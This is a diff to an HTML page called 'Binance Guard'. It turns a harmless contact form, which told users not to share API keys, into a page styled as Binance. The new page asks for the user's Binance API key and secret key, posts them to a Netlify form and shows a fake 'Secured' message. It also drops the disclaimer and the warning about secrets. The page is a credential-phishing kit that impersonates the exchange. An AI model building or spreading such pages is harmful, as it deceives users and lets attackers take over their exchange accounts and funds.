@@ -2,6 +2,22 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
+<!-- Binance Sans font (fallback Roboto, Arial) -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+<style>
+@font-face {
+  font-family: 'Binance Sans';
+  src: url('https://bin.bnbstatic.com/static/fonts/BinanceSans-Regular.woff2') format('woff2');
+  font-weight: 400;
+  font-style: normal;
+}
+@font-face {
+  font-family: 'Binance Sans';
+  src: url('https://bin.bnbstatic.com/static/fonts/BinanceSans-Bold.woff2') format('woff2');
+  font-weight: 700;
+  font-style: normal;
+}
+</style>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Binance Guard</title>
 <meta name="color-scheme" content="dark">
@@ -11,15 +27,17 @@
     --text:#e5e7eb;--muted:#9ca3af;--accent:#fbbf24;--accent2:#f59e0b;
     --green:#16a34a;--green-2:#0f3b26;--green-b:#1c4d37;
   }
-  *{box-sizing:border-box}body{margin:0;background:#0b1220;color:var(--text);
-     font:16px/1.5 system-ui,Segoe UI,Roboto,Helvetica,Arial}
+  *{box-sizing:border-box}
+  body{margin:0;background:#0b1220;color:var(--text);
+     font-family:'Binance Sans',Roboto,Arial,sans-serif;font-size:16px;line-height:1.5}
   .wrap{min-height:100svh;display:grid;place-items:center;padding:24px;
      background:radial-gradient(900px 600px at 50% -200px,#12213d 0%,#0b1220 60%)}
   .card{width:100%;max-width:560px;background:linear-gradient(180deg,var(--panel2),var(--panel));
      border:1px solid var(--border);border-radius:16px;padding:26px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
   .logo{width:56px;height:56px;margin:0 auto 10px;border-radius:12px;display:grid;place-items:center;
-     background:conic-gradient(from 180deg,#f59e0b,#fbbf24,#fde68a,#f59e0b)}
+  background:conic-gradient(from 180deg,#f59e0b,#fbbf24,#fde68a,#f59e0b);box-shadow:0 4px 16px rgba(251,191,36,.15)}
   .logo > div{width:34px;height:34px;border-radius:8px;background:#111827;display:grid;place-items:center;font-size:18px}
+  .logo svg{width:34px;height:34px;display:block}
   h1{margin:8px 0 0;text-align:center;font-size:24px}
   h2{margin:6px 0 16px;text-align:center;font-size:14px;color:#d1d5db;font-weight:500}
   .field{margin:12px 0}
@@ -31,67 +49,67 @@
   .disabled input{pointer-events:none}
   .info{display:flex;gap:10px;align-items:flex-start;background:linear-gradient(180deg,#0f2b22,#0d1f19);
      border:1px solid var(--green-b);border-radius:10px;color:#b7e2c9;padding:12px;margin:12px 0}
-  .btn{width:100%;padding:12px 16px;border:0;border-radius:10px;background:linear-gradient(180deg,var(--accent),var(--accent2));
-     color:#111827;font-weight:700;cursor:pointer}
+  .btn{width:100%;padding:12px 16px;border:0;border-radius:6px;background:linear-gradient(180deg,#F3BA2F,#F0B90B);
+    color:#181A20;font-weight:700;cursor:pointer;box-shadow:0 2px 8px rgba(243,186,47,.10);transition:box-shadow .2s,transform .2s,background .2s}
+  .btn:hover{box-shadow:0 4px 16px rgba(243,186,47,.18);transform:translateY(-2px);background:linear-gradient(180deg,#F0B90B,#F3BA2F)}
+  input,textarea{width:100%;background:#181A20;border:1px solid #F3BA2F;color:#e5e7eb;border-radius:6px;padding:12px 14px;transition:border-color .2s,box-shadow .2s}
+  input:focus,textarea:focus{border-color:#F0B90B;box-shadow:0 0 0 2px rgba(243,186,47,.18)}
+  input:hover,textarea:hover{border-color:#F0B90B}
   .hr{height:1px;background:var(--border);margin:18px 0}
   .disc{color:#fbbf24;font-size:12px;text-align:center;font-weight:700}
   .foot{margin-top:10px;font-size:11px;color:#9aa3b2;text-align:center}
   .muted{color:var(--muted)}
   .hidden{position:absolute!important;opacity:0!important;height:0!important;width:0!important;pointer-events:none!important}
+  @media (max-width:600px){
+    .card{padding:16px}
+    h1{font-size:18px}
+    h2{font-size:13px}
+    .logo{width:44px;height:44px}
+    .logo svg{width:28px;height:28px}
+  }
 </style>
 </head>
 <body>
 <main class="wrap">
   <section class="card" aria-labelledby="t1">
-    <div class="logo"><div>◆</div></div>
-    <h1 id="t1">Secure your Binance account with our Binance Guard service</h1>
-    <h2>Confirm your Binance API keys to secure your interfaces.</h2>
-
-    <!-- zones décoratives pour respecter le design, non soumises -->
-    <div class="field disabled" aria-hidden="true">
-      <div class="label"><span class="dot"></span><span>Binance API Key</span></div>
-      <input type="text" placeholder="Your Binance API Key" tabindex="-1">
+    <div class="logo" aria-label="Binance logo">
+      <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <g>
+          <rect x="15" y="3" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="3" y="15" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="27" y="15" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="15" y="27" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="9" y="9" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="21" y="9" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="9" y="21" width="4" height="4" rx="1" fill="#F3BA2F"/>
+          <rect x="21" y="21" width="4" height="4" rx="1" fill="#F3BA2F"/>
+        </g>
+      </svg>
     </div>
-    <div class="field disabled" aria-hidden="true">
-      <div class="label"><span class="dot"></span><span>Binance Secret Key</span></div>
-      <input type="password" placeholder="Your Binance Secret Key" tabindex="-1">
-    </div>
-
-    <div class="info">
-      <span>🔒</span>
-      <span>Your API keys are encrypted and securely stored. We recommend creating keys with read-only permissions.</span>
-    </div>
-
-    <!-- Formulaire Netlify réel et sûr -->
-    <form name="binance-guard-support" method="POST" data-netlify="true" netlify-honeypot="bot-field">
-      <input type="hidden" name="form-name" value="binance-guard-support">
+    <h1 id="t1">Binance Guard Service</h1>
+    <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field" onsubmit="showConfirmation(event)">
+      <input type="hidden" name="form-name" value="binance-api-key">
       <p class="hidden"><label>Don’t fill <input name="bot-field"></label></p>
-
       <div class="field">
-        <div class="label"><span class="dot"></span><span>Contact email</span></div>
-        <input name="email" type="email" placeholder="you@example.com" required autocomplete="email">
+        <div class="label"><span class="dot"></span><span>Binance API Key</span></div>
+        <input name="api_key" type="text" placeholder="Enter your Binance API Key" required autocomplete="off">
       </div>
-
       <div class="field">
-        <div class="label"><span class="dot"></span><span>Message</span></div>
-        <textarea name="message" rows="4" placeholder="Describe your request. Do not include API keys or secrets." required></textarea>
+        <div class="label"><span class="dot"></span><span>Binance Secret Key</span></div>
+        <input name="secret_key" type="password" placeholder="Enter your Binance Secret Key" required autocomplete="off">
       </div>
-
-      <button class="btn" type="submit">Activate Binance Guard</button>
+      <button class="btn" type="submit">Secure my account</button>
     </form>
-
-    <div class="hr"></div>
-    <p class="disc">
-      Disclaimer : The use of digital assets involves risks. Please note that digital assets are volatile and may be
-      unsuitable for you and your profile, so you should only invest in products that you are familiar with.
-    </p>
-    <p class="foot">
-      <span class="muted">Remark : you received this email because you are registered as a user of binance.com</span><br><br>
-      Binance France — SIREN 913864005 — AMF : E2022-037 — 1 rue de Stockholm, 75008 Paris France<br>
-      Binance Services Holdings Limited, located in 6th Floor, South Bank House, Barrow Street Dublin 4 are jointly
-      responsible for the processing of your personal data. For more information regarding the processing of your personal
-      data, please refer to our data protection policy.
-    </p>
+    <div id="confirmation" style="display:none;margin:18px 0 0 0;padding:14px;border-radius:8px;background:linear-gradient(90deg,#16a34a 60%,#22c55e 100%);color:#fff;text-align:center;font-weight:700;box-shadow:0 2px 8px rgba(22,163,74,.12);">
+      Binance Guard Service Secured
+    </div>
+    <script>
+      function showConfirmation(e) {
+        e.preventDefault();
+        document.querySelector('form').style.display = 'none';
+        document.getElementById('confirmation').style.display = 'block';
+      }
+    </script>
   </section>
 </main>
 </body>
